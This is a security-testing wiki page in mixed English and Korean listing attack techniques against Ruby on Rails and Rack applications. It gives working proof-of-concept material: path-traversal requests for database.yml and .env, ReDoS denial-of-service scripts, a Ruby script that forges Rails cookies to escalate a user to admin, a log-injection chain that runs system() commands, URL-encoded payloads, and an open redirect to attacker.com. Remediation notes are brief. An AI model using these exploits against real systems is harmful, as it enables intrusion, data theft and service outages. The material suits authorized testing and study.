# Ruby Tricks

{{#include ../../banners/hacktricks-training.md}}

## File upload to RCE

As explained in [this article](https://www.offsec.com/blog/cve-2024-46986/), uploading a `.rb` file into sensitive directories such as `config/initializers/` can lead to remote code execution (RCE) in Ruby on Rails applications.

팁:
- 앱 시작 시 실행되는 다른 boot/eager-load 위치도 쓰기 가능하면 위험합니다(예: `config/initializers/`가 전형적 사례). 임의 파일 업로드가 `config/` 아래 아무 곳에나 저장되고 나중에 evaluated/required 된다면 부팅 시 RCE를 얻을 수 있습니다.
- Rails가 부팅 시 로드하는 컨테이너 이미지로 사용자 제어 파일을 복사하는 dev/staging 빌드를 찾아보세요.

## Active Storage image transformation → command execution (CVE-2025-24293)

When an application uses Active Storage with `image_processing` + `mini_magick`, and passes untrusted parameters to image transformation methods, Rails versions prior to 7.1.5.2 / 7.2.2.2 / 8.0.2.1 could allow command injection because some transformation methods were mistakenly allowed by default.

- A vulnerable pattern looks like:
```erb
<%= image_tag blob.variant(params[:t] => params[:v]) %>
```
where `params[:t]` and/or `params[:v]` are attacker-controlled.

- What to try during testing
- Identify any endpoints that accept variant/processing options, transformation names, or arbitrary ImageMagick arguments.
- Fuzz `params[:t]` and `params[:v]` for suspicious errors or execution side-effects. If you can influence the method name or pass raw arguments that reach MiniMagick, you may get code exec on the image processor host.
- If you only have read-access to generated variants, attempt blind exfiltration via crafted ImageMagick operations.

- Remediation/detections
- If you see Rails < 7.1.5.2 / 7.2.2.2 / 8.0.2.1 with Active Storage + `image_processing` + `mini_magick` and user-controlled transformations, consider it exploitable. Recommend upgrading and enforcing strict allowlists for methods/params and a hardened ImageMagick policy.

## Rack::Static LFI / path traversal (CVE-2025-27610)

If the target stack uses Rack middleware directly or via frameworks, versions of `rack` prior to 2.2.13, 3.0.14, and 3.1.12 allow Local File Inclusion via `Rack::Static` when `:root` is unset/misconfigured. Encoded traversal in `PATH_INFO` can expose files under the process working directory or an unexpected root.

- Hunt for apps that mount `Rack::Static` in `config.ru` or middleware stacks. Try encoded traversals against static paths, for example:
```text
GET /assets/%2e%2e/%2e%2e/config/database.yml
GET /favicon.ico/..%2f..%2f.env
```
설정된 `urls:`의 접두사에 맞게 경로를 조정하세요. 앱이 파일 내용을 반환하면, 해결된 `:root` 아래의 모든 항목에 대해 LFI가 가능한 상태일 가능성이 높습니다.

- Mitigation: upgrade Rack; ensure `:root` only points to a directory of public files and is explicitly set.

## Rack multipart parser ReDoS / request smuggling (CVE-2024-25126)

Rack < `3.0.9.1` and < `2.2.8.1` spent super-linear time parsing crafted `Content-Type: multipart/form-data` headers. A single POST with a gigantic `A=` parameter list can peg a Puma/Unicorn worker and cause DoS or request queue starvation.

- Quick PoC (will hang one worker):
```bash
python - <<'PY'
import requests
h = {'Content-Type': 'multipart/form-data; ' + 'A='*5000}
requests.post('http://target/', data='x', headers=h)
PY
```
- Works against any Rack-based stack (Rails/Sinatra/Hanami/Grape). If fronted by nginx/haproxy with keep-alive, repeat in parallel to exhaust workers.
- Patched by making parser linear; look for `rack` gem version < `3.0.9.1` or < `2.2.8.1`. In assessments, point out that WAFs rarely block this because the header is syntactically valid.

## REXML XML parser ReDoS (CVE-2024-49761)

The REXML gem < 3.3.9 (Ruby 3.1 and earlier) catastrophically backtracks when parsing hex numeric character references containing long digit runs (e.g., `&#1111111111111x41;`). Any XML processed by REXML or libraries that wrap it (SOAP/XML API clients, SAML, SVG uploads) can be abused for CPU exhaustion.

Minimal trigger against a Rails endpoint that parses XML:
```bash
curl -X POST http://target/xml -H 'Content-Type: application/xml' \
--data '<?xml version="1.0"?><r>&#11111111111111111111111111x41;</r>'
```
If the process stays busy for seconds and worker CPU spikes, it is likely vulnerable. 공격은 저대역폭이며 XML을 수집하는 백그라운드 작업에도 영향을 줍니다.

## CGI cookie parsing / escapeElement ReDoS (CVE-2025-27219 & CVE-2025-27220)

`cgi` gem을 사용하는 앱(Rack 스택의 기본 구성인 경우가 많음)은 단일 악성 헤더로 멈출 수 있습니다:
- `CGI::Cookie.parse` was super-linear; 거대한 cookie 문자열(수천 개의 구분자)은 O(N²) 동작을 유발합니다.
- `CGI::Util#escapeElement` regex는 HTML 이스케이핑에 대한 ReDoS를 허용했습니다.

Both issues are fixed in `cgi` 0.3.5.1 / 0.3.7 / 0.4.2. For pentests, 대량의 `Cookie:` 헤더를 전송하거나 신뢰되지 않은 HTML을 헬퍼 코드에 넣어 워커 정지를 관찰하세요. keep-alive와 결합하면 영향이 증폭됩니다.

## Basecamp `googlesign_in` open redirect / cookie flash leak (CVE-2025-57821)

`googlesign_in` gem < 1.3.0 (Rails에서 Google OAuth에 사용됨)는 `proceedto` 파라미터에 대해 불완전한 same-origin 검사를 수행했습니다. `proceedto=//attacker.com/%2F..` 같은 잘못된 URL은 검사를 우회하고 Rails flash/session 쿠키를 유지한 채로 사용자를 외부 사이트로 리디렉션합니다.

Exploit flow:
1. 피해자가 공격자가 호스팅한 조작된 Google Sign-In 링크를 클릭합니다.
2. 인증 후, gem은 공격자 제어 도메인으로 리디렉션하며, leaking flash notices 또는 와일드카드 도메인 범위의 쿠키에 저장된 모든 데이터를 노출합니다.
3. 앱이 short-lived tokens 또는 magic links를 flash에 저장하는 경우, 이는 account takeover로 전환될 수 있습니다.

테스트 시에는 Gemfile.lock에서 `googlesign_in` < 1.3.0을 grep하고 잘못된 `proceedto` 값을 시도해 보세요. Location header와 cookie reflection로 확인합니다.

## Forging/decrypting Rails cookies when `secret_key_base` is leaked

Rails는 `secret_key_base`에서 파생된 키를 사용해 쿠키를 암호화하고 서명합니다. If that value leaks (예: repo, logs, 또는 misconfigured credentials에), 일반적으로 쿠키를 decrypt, modify, re-encrypt할 수 있습니다. 앱이 roles, user IDs 또는 feature flags를 쿠키에 저장하는 경우 이는 authz bypass로 이어지는 경우가 많습니다.

Minimal Ruby to decrypt and re-encrypt modern cookies (AES-256-GCM, default in recent Rails):

<details>
<summary>Ruby to decrypt/forge cookies</summary>
```ruby
require 'cgi'
require 'json'
require 'active_support'
require 'active_support/message_encryptor'
require 'active_support/key_generator'

secret_key_base = ENV.fetch('SECRET_KEY_BASE_LEAKED')
raw_cookie = CGI.unescape(ARGV[0])

salt   = 'authenticated encrypted cookie'
cipher = 'aes-256-gcm'
key_len = ActiveSupport::MessageEncryptor.key_len(cipher)
secret  = ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000).generate_key(salt, key_len)
enc     = ActiveSupport::MessageEncryptor.new(secret, cipher: cipher, serializer: JSON)

plain = enc.decrypt_and_verify(raw_cookie)
puts "Decrypted: #{plain.inspect}"

# Modify and re-encrypt (example: escalate role)
plain['role'] = 'admin' if plain.is_a?(Hash)
forged = enc.encrypt_and_sign(plain)
puts "Forged cookie: #{CGI.escape(forged)}"
```
</details>
참고:
- 이전 버전의 앱은 AES-256-CBC와 salts `encrypted cookie` / `signed encrypted cookie`, 또는 JSON/Marshal serializers를 사용할 수 있습니다. salts, cipher, serializer를 적절히 조정하세요.
- 침해/평가 시, 모든 기존 쿠키를 무효화하려면 `secret_key_base`를 교체하세요.

## See also (Ruby/Rails-specific vulns)

- Ruby deserialization and class pollution:
{{#ref}}
../../pentesting-web/deserialization/README.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-class-pollution.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-_json-pollution.md
{{#endref}}
- Template injection in Ruby engines (ERB/Haml/Slim, etc.):
{{#ref}}
../../pentesting-web/ssti-server-side-template-injection/README.md
{{#endref}}


## Log Injection → RCE via Ruby `load` and `Pathname.cleanpath` smuggling

앱(종종 간단한 Rack/Sinatra/Rails 엔드포인트)이 다음 둘을 모두 만족할 때:
- 사용자 제어 문자열을 그대로 로그에 기록하고,
- 그 후 동일한 문자열에서 파생된 경로를 가진 파일을 `load`한다(`Pathname#cleanpath` 적용 후),

로그를 오염시킨 뒤 애플리케이션이 로그 파일을 `load`하도록 유도하면 원격 코드 실행을 달성할 수 있습니다. 핵심 원리:

- Ruby의 `load`는 파일 확장자와 상관없이 대상 파일의 내용을 Ruby로 평가합니다. 내용이 Ruby로 파싱되는 읽을 수 있는 텍스트 파일이면 어떤 것이든 실행됩니다.
- `Pathname#cleanpath`는 파일시스템을 조회하지 않고 `.` 및 `..` 세그먼트를 축소(collapse)합니다. 이는 path smuggling을 가능하게 합니다: 공격자가 제어하는 불필요한 문자열을 로그 앞에 추가해도 청소된 경로가 여전히 실행하려는 의도된 파일을 가리킬 수 있습니다(예: `../logs/error.log`).

### 최소 취약 패턴
```ruby
require 'logger'
require 'pathname'

logger   = Logger.new('logs/error.log')
param    = CGI.unescape(params[:script])
path_obj = Pathname.new(param)

logger.info("Running backup script #{param}")            # Raw log of user input
load "scripts/#{path_obj.cleanpath}"                     # Executes file after cleanpath
```
### 왜 로그에 유효한 Ruby가 포함될 수 있는가
`Logger`는 다음과 같은 접두사 줄을 기록한다:
```
I, [9/2/2025 #209384]  INFO -- : Running backup script <USER_INPUT>
```
Ruby에서는 `#`가 주석을 시작하고 `9/2/2025`는 단순한 산술 연산입니다. 유효한 Ruby 코드를 주입하려면 다음이 필요합니다:
- payload는 INFO 라인의 `#`에 의해 주석 처리되지 않도록 새 줄에서 시작해야 합니다; 선행 개행(`\n` 또는 `%0A`)을 전송하세요.
- INFO 라인에서 도입된 열린 `[`를 닫아야 합니다. 흔한 트릭으로는 `]`로 시작하고 선택적으로 파서를 만족시키기 위해 `][0]=1`을 추가하는 것입니다.
- 그 다음 임의의 Ruby 코드를 넣습니다(예: `system(...)`).

조작된 param으로 요청 하나를 보냈을 때 로그에 남게 될 예시는 다음과 같습니다:
```
I, [9/2/2025 #209384]  INFO -- : Running backup script
][0]=1;system("touch /tmp/pwned")#://../../../../logs/error.log
```
### 코드가 로그에 기록되면서 동시에 로그 경로로 해석되는 단일 문자열 스머글링
우리는 공격자가 제어하는 하나의 문자열을 원한다. 이 문자열은:
- 로그에 그대로 기록될 때, 우리 Ruby payload를 포함하고,
- `Pathname.new(<input>).cleanpath`를 거치면 `../logs/error.log`로 해석되어 이후의 `load`가 방금 오염된 로그 파일을 실행하도록.

`Pathname#cleanpath`는 스킴을 무시하고 탐색(traversal) 구성요소를 축약하므로, 다음이 작동한다:
```ruby
require 'pathname'

p = Pathname.new("\n][0]=1;system(\"touch /tmp/pwned\")#://../../../../logs/error.log")
puts p.cleanpath   # => ../logs/error.log
```
- `://` 앞의 `#`는 로그가 실행될 때 Ruby가 꼬리 부분을 무시하도록 하며, `cleanpath`는 접미사를 `../logs/error.log`로 줄입니다.
- 선행하는 newline은 INFO 라인에서 빠져나오게 하고; `]`는 열린 대괄호를 닫으며; `][0]=1`은 파서를 만족시킵니다.

### End-to-end exploitation
1. 다음을 백업 스크립트 이름으로 전송하세요 (필요하면 첫 번째 개행을 `%0A`로 URL-인코딩하세요):
```
\n][0]=1;system("id > /tmp/pwned")#://../../../../logs/error.log
```
2. 앱은 당신의 원본 문자열을 `logs/error.log`에 기록합니다.
3. 앱은 `cleanpath`를 계산하여 `../logs/error.log`로 해석하고 여기에 대해 `load`를 호출합니다.
4. Ruby는 로그에 주입한 코드를 실행합니다.

CTF와 유사한 환경에서 파일을 추출하려면:
```
\n][0]=1;f=Dir['/tmp/flag*.txt'][0];c=File.read(f);puts c#://../../../../logs/error.log
```
URL-encoded PoC (첫 문자가 줄바꿈):
```
%0A%5D%5B0%5D%3D1%3Bf%3DDir%5B%27%2Ftmp%2Fflag%2A.txt%27%5D%5B0%5D%3Bc%3DFile.read(f)%3Bputs%20c%23%3A%2F%2F..%2F..%2F..%2F..%2Flogs%2Ferror.log
```
## 참고자료

- [Rails 보안 공지: CVE-2025-24293 Active Storage 안전하지 않은 변환 메서드 (해결 버전: 7.1.5.2 / 7.2.2.2 / 8.0.2.1)](https://discuss.rubyonrails.org/t/cve-2025-24293-active-storage-allowed-transformation-methods-potentially-unsafe/89670)
- [GitHub 권고: Rack::Static Local File Inclusion (CVE-2025-27610)](https://github.com/advisories/GHSA-7wqh-767x-r66v)
- [Hardware Monitor Dojo-CTF #44: Log Injection to Ruby RCE (YesWeHack Dojo)](https://www.yeswehack.com/dojo/dojo-ctf-challenge-winners-44)
- [Ruby Pathname.cleanpath 문서](https://docs.ruby-lang.org/en/3.4/Pathname.html#method-i-cleanpath)
- [Ruby Logger 문서](https://ruby-doc.org/stdlib-2.5.1/libdoc/logger/rdoc/Logger.html)
- [Ruby의 load 작동 방식](https://blog.appsignal.com/2023/04/19/how-to-load-code-in-ruby.html)
- [Rack multipart ReDoS 권고 (CVE-2024-25126)](https://www.cve.news/cve-2024-25126/)
- [Ruby CGI/URI 관련 보안 권고 (CVE-2025-27219/27220/27221)](https://www.ruby-lang.org/en/news/2025/02/26/security-advisories/)

{{#include ../../banners/hacktricks-training.md}}
